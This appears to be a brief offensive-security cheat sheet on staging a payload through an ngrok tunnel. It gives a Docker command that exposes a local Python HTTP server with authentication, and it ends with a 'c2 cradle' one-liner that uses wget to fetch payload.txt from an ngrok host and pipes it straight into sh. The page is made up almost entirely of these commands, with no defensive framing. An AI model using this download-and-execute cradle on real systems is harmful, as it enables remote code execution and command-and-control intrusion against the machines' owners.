# Ngrok wget execute (http)

```
docker run -it -e NGROK_AUTHTOKEN=<ngrok_authtoken> ngrok/ngrok http host.docker.internal:8081 --region=us --hostname=site.ngrok.io -auth="user:password"
```

Run ngrok with Docker pointing to localhost (host machine) using hostname with auth (Requires ngrok pro)

```
python3 -m http.server 8081
```

Setup python3 http server on port 8081 (host machine)

```
wget -O- --user=user --password='password' http://sneakerhax.ngrok.io/payload.txt 2>/dev/null | sh
```

Basic wget c2 cradle payload execution
